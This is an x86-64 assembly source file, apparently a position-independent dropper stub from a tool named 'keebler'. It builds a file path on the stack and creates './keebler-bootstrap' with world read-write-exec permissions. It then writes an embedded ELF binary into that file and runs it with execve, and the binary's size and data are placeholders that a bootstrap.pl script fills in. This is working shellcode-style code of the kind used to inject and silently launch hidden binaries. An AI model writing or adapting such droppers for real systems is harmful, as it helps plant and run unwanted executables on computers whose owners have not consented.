.text
.globl _start
_start:
  pushq %rbp
  pushq %rbx
  mov %rsp,%rbp
 
################################################################################
# Open our temporary file
################################################################################
#push "./keebler-bootstrap" onto the stack
  xor %rcx, %rcx
  pushq %rcx
  movq $0x0000000000706172, %rcx
  pushq %rcx
  movq $0x7473746f6f622d72, %rcx
  pushq %rcx
  movq $0x656c6265656b2f2e, %rcx
  pushq %rcx
  movq %rsp, %rdi
  pushq %rdi #save the string, we'll need it later
#we want to create it if it doesn't exist
  movq $0x242, %rsi
#we want world read write exec
  movq $0x1FF, %rdx
#we want the open sys call
  movq $2, %rax
  syscall
 
################################################################################
# Write to our file!
################################################################################
#file pointer in rdi
  movq %rax, %rdi #grab the file pointer
  push %rdi
#jump to the elf into then call back to get it's memory location
  jmp _elf_info
_save_info:
  pop %rcx #the location in memory of the size
#grab the size
  xorq %rdx, %rdx
  movl (%rcx), %edx
#point to the elf info
  leaq 0x4(%rcx), %rsi
#we want the write sys call
  movq $0x01, %rax
  syscall
 
################################################################################
# Close our temporary file
################################################################################
#we want the close sys call
  pop %rdi #grab the file pointer
  movq $0x03, %rax
  syscall

################################################################################
# Execute the bootstrapped elf
################################################################################
#load the file string
  pop %rdi
#Create an array of string pointers on the stack or ARGV and ENV
  pushq $0 #must be null terminated
  movq %rsp, %rdx #save just the null array for ENV
  pushq %rdi #push the file path
  movq %rsp, %rsi #argv is [filepath,0]
#we want the execve sys call
  movq $59, %rax
  syscall


_finish:
#pop off all our strings
  pop %rcx
  pop %rcx
  pop %rcx

#return
  pop %rbx
  pop %rbp
  ret

_elf_info:
  call _save_info
#replaced by bootstrap.pl
_elf_size: <_elf_size>
_elf_data: <_elf_data>
